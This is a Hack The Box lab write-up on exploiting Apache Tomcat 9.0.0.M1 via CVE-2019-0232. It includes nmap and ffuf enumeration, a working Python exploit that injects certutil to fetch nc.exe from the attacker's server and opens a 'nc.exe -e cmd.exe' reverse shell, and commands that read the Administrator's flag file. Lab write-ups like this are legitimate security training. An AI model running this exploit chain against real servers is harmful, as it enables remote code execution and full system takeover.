# Hack The Box – Attacking Common Applications (Skills Assessment I)

![Category: Web Exploitation](https://img.shields.io/badge/Category-Web%20Exploitation-orange)<br>
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-blue)<br>
![Platform: Hack%20The%20Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)

---

## 📌 Overview

This skills assessment focuses on **real‑world application exploitation techniques** against a Windows‑based target. The objective was to identify a vulnerable service, confirm exploitability through enumeration and research, and leverage a known vulnerability to achieve **remote command execution (RCE)**.

The assessment demonstrates how **legacy application versions, insecure CGI configurations, and weak exposure controls** can be combined to gain full system‑level access.

> _In this write‑up, we cover_

- Service and version enumeration
- Vulnerability identification through version analysis
- CGI endpoint discovery
- Exploitation of Apache Tomcat RCE (CVE‑2019‑0232)
- Reverse shell acquisition
- Sensitive file access

> ⚠️ **Note:** Certain values (IPs, flags, exact payloads) are intentionally **redacted or generalized** to prevent solution skipping.

---

## 🛠 Tools

The following tools and techniques were used:

```
nmap              → Network & service enumeration
ffuf              → Endpoint discovery
Python            → Exploit execution
netcat (nc)       → Reverse shell handling
Linux terminal    → Hosting & automation
```

---

## What vulnerable application is running?

So first, I started with an **Nmap scan** to enumerate the target services.

```bash
nmap -A -oN enum.txt 10.129.201.89
```

### Nmap Results

```
PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           Microsoft ftpd
80/tcp   open     http          Microsoft IIS httpd 10.0
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds?
3389/tcp open     ms-wbt-server Microsoft Terminal Services
8000/tcp open     http          Jetty 9.4.42.v20210604
8009/tcp open     ajp13         Apache Jserv (Protocol v1.3)
8080/tcp open     http          Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/9.0.0.M1
```

From the scan results, **Apache Tomcat** stood out as the most promising attack surface.

---

## What port is this application running on?

```
8080
```

---

## What version of the application is in use?

```
Apache Tomcat 9.0.0.M1
```

---

## Vulnerability Research

After Googling the version, I found that **Apache Tomcat 9.0.0.M1** is vulnerable to **command execution** when CGI is enabled on Windows systems.

The vulnerability is tracked as:

```
CVE-2019-0232
```

This vulnerability allows attackers to execute arbitrary system commands via crafted requests to `.bat` CGI scripts.

---

## Finding the CGI Endpoint

Next, I fuzzed the Tomcat CGI directory to look for accessible batch files.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat
```

### Result

```
***.bat
```

This confirmed that CGI execution was enabled and exploitable.

---

## Exploitation (CVE-2019-0232)

I cloned the public exploit from GitHub:

```
https://github.com/jaiguptanick/CVE-2019-0232
```

After downloading and extracting the exploit, I modified the script to match the target and my attacker machine.

### Modified Exploit Script

```python
#!/usr/bin/env python3
import time
import requests

host='10.129.201.89'
port='8080'
server_ip='10.10.15.22'      # Attacker IP hosting nc.exe
server_port='8000'
nc_ip='10.10.15.22'
nc_port='1234'

url1 = host + ":" + str(port) + "/cgi/cmd.bat?" + "&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F" + server_ip + ":" + server_port + "%2Fnc%2Eexe+nc.exe"

url2 = host + ":" + str(port) + "/cgi/cmd.bat?&nc.exe+" + server_ip + "+" + nc_port + "+-e+cmd.exe"

try:
    requests.get("http://" + url1)
    time.sleep(2)
    requests.get("http://" + url2)
    print(url2)
except:
    print("Some error occurred in the script")
```

---

## Exploitation Setup

### Tab 1 – Start Listener

```bash
nc -lnvp 1234
```

### Tab 2 – Host nc.exe

Make sure you are inside the exploit directory:

```bash
cd ~/Downloads/CVE-2019-0232-main
sudo python3 -m http.server 8000
```

### Tab 3 – Run the Exploit

```bash
python3 CVE-2019-0232.py
```

---

## Reverse Shell

After running the exploit, the target connected back to my listener, giving **remote command execution**.

```bash
nc -lnvp 1234
```

---

## Flag Retrieval

Once the shell was obtained, I navigated to the Administrator desktop.

```cmd
dir "C:\Users\Administrator\Desktop" /A
```

Then read the flag file:

```cmd
type "C:\Users\Administrator\Desktop\flag.txt"
```

### Flag

```
f55763d3*****************************
```

---

## Summary

This assessment demonstrates how **outdated Apache Tomcat versions with CGI enabled** can be fully compromised using a public exploit. Proper patching and disabling unnecessary CGI functionality are critical to preventing this type of attack.

---

## 🧠 What This Assessment Teaches

- Version enumeration is critical in application security
- Legacy Tomcat versions remain highly exploitable
- CGI functionality dramatically increases attack surface
- Public exploits still require correct adaptation
- RCE vulnerabilities often lead directly to full system compromise

---

## 📌 Conclusion

This skills assessment highlights how **outdated application components combined with insecure configurations** can expose critical systems to complete takeover.

Even without complex payloads, chaining **enumeration + version analysis + known CVEs** is often sufficient to compromise real‑world environments.

> _Secure configuration, patch management, and attack surface reduction are essential defenses._

---

## Author: Z4B0

## [LinkedIn:](https://www.linkedin.com/in/mahamud-abdirahman-151493375/)
